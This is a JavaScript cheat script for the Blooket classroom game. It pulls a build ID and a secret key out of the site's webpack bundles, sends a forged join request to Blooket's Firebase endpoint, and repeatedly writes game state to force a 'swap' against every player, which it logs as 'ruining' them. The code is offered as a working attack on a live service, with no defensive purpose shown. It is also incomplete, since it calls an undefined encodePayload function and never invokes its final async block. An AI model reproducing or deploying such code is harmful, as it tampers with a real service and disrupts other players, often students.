let e = Object.values(document.querySelector('#app > div > div'))[1].children[1]._owner;

function ruinPlayer(name) {
    setInterval(() => {
        e.memoizedProps.firebase.setVal({
            id: e.memoizedProps.client.hostId,
            path: "c/" + e.memoizedProps.client.name,
            val: {
                b: e.memoizedProps.client.blook,
                g: e.stateNode.state.gold,
                tat: name + ":swap:" + 0
            }
        })
    }, 300)
}

window.blooketBuild = window.webpackJsonp.map(e => Object.keys(e[1]).map(t => e[1][t])).reduce((e, t) => [...e, ...t], []).find(e => /\w{8}-\w{4}-\w{4}-\w{4}-\w{12}/.test(e.toString()) && /\(new TextEncoder\)\.encode\(\"(.+?)\"\)/.test(e.toString())).toString().match(/\w{8}-\w{4}-\w{4}-\w{4}-\w{12}/)[0]

window.secret = window.webpackJsonp.map(e => Object.keys(e[1]).map(t => e[1][t])).reduce((e, t) => [...e, ...t], []).find(e => /\w{8}-\w{4}-\w{4}-\w{4}-\w{12}/.test(e.toString()) && /\(new TextEncoder\)\.encode\(\"(.+?)\"\)/.test(e.toString())).toString().match(/\(new TextEncoder\)\.encode\(\"(.+?)\"\)/)[1]


(async () => {
    await fetch("https://fb.blooket.com/c/firebase/join", {
        headers: {
            "X-Blooket-Build": window.blooketBuild,
            "Content-Type": "text/plain"
        },
        credentials: "include",
        method: "put",
        body: await encodePayload({
            id: e.memoizedProps.client.hostId,
            name: 'gtjh45',
        }, window.secret),
    }).then(async (res) => {
        e.memoizedProps.players = (await res.json()).host.c
    })
    e.memoizedProps.players.forEach((p) => {
        console.log(`ruining ${p}`)
        ruinPlayer(p)
    })

})
